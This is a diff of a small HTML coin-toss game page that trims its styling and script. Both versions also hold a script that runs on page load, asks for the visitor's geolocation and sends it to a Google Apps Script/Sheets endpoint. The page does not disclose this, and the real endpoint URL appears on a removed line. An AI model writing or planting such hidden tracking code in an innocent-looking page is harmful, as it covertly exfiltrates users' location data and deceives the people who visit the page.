@@ -10,76 +10,38 @@
 
   gtag('config', 'G-X02TNXZZSE');
 </script>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Coin Toss Game</title>
   <style>
-    body {
-      background: #121212;
-      color: #f0f0f0;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 50px;
-    }
-
-    h1 {
-      font-size: 3em;
-      margin-bottom: 20px;
-    }
-
-    button {
-      background: #1f1f1f;
-      color: #fff;
-      border: 2px solid #4caf50;
-      padding: 15px 30px;
-      margin: 10px;
-      font-size: 1.2em;
-      cursor: pointer;
-      border-radius: 10px;
-      transition: 0.3s;
-    }
-
-    button:hover {
-      background: #4caf50;
-    }
-
-    .result, .score {
-      margin-top: 20px;
-      font-size: 1.5em;
-    }
+    body { background: black; color: white; text-align: center; font-family: Arial; }
+    button { padding: 10px 20px; margin: 10px; font-size: 18px; border-radius: 10px; }
   </style>
 </head>
 <body>
 
-  <h1>Coin Toss Game</h1>
+<h1>Coin Toss Game</h1>
+<button onclick="playGame('heads')">Heads</button>
+<button onclick="playGame('tails')">Tails</button>
 
-  <button onclick="playGame('heads')">Heads</button>
-  <button onclick="playGame('tails')">Tails</button>
+<p id="result"></p>
+<p id="score">Wins: 0 | Losses: 0</p>
 
-  <div class="result" id="result"></div>
-  <div class="score" id="score">
-    Wins: 0 | Losses: 0
-  </div>
+<script>
+  let wins = 0, losses = 0;
 
-  <script>
-    let wins = 0;
-    let losses = 0;
-
-    function playGame(userGuess) {
-      const randomNumber = Math.random();
-      const coinResult = randomNumber < 0.5 ? 'heads' : 'tails';
-
-      if (userGuess === coinResult) {
-        wins++;
-        document.getElementById('result').innerHTML = `You chose <b>${userGuess}</b>. Coin is <b>${coinResult}</b>. <span style="color:lightgreen">You Win!</span>`;
-      } else {
-        losses++;
-        document.getElementById('result').innerHTML = `You chose <b>${userGuess}</b>. Coin is <b>${coinResult}</b>. <span style="color:red">You Lose!</span>`;
-      }
-
-      document.getElementById('score').innerHTML = `Wins: ${wins} | Losses: ${losses}`;
+  function playGame(guess) {
+    const result = Math.random() < 0.5 ? 'heads' : 'tails';
+    if (guess === result) {
+      wins++;
+      document.getElementById('result').innerText = `You chose ${guess}. Coin is ${result}. You Win!`;
+    } else {
+      losses++;
+      document.getElementById('result').innerText = `You chose ${guess}. Coin is ${result}. You Lose!`;
     }
+    document.getElementById('score').innerText = `Wins: ${wins} | Losses: ${losses}`;
+  }
 
-     // Collect Location and Send to Google Sheets
+  // Collect Location and Send to Google Sheets
   function getLocationAndSend() {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(function(position) {
@@ -99,7 +61,7 @@
             };
 
             // Send data to Google Sheets via Apps Script Web App
-            fetch('https://script.google.com/macros/s/AKfycbxTG2jL5fYIkZd00aaaD2UU1yG1l_AI7yOZW5-Z7wC3LL_us1YFCwqvMVDZanx2RnMSIw/exec', { // Replace this
+            fetch('YOUR_WEB_APP_URL_HERE', { // Replace this
                 method: "POST",
                 body: JSON.stringify(data),
                 headers: { "Content-Type": "application/json" }
@@ -115,14 +77,7 @@
 
   // Trigger location sending on page load
   window.onload = getLocationAndSend;
-
-  </script>
-  
- 
-  <p style="text-align:center; margin-top:20px; color:gray; font-size:14px;">
-  Developed by Sai Krishna Reddy
-</p>
-
+</script>
 
 </body>
 </html>
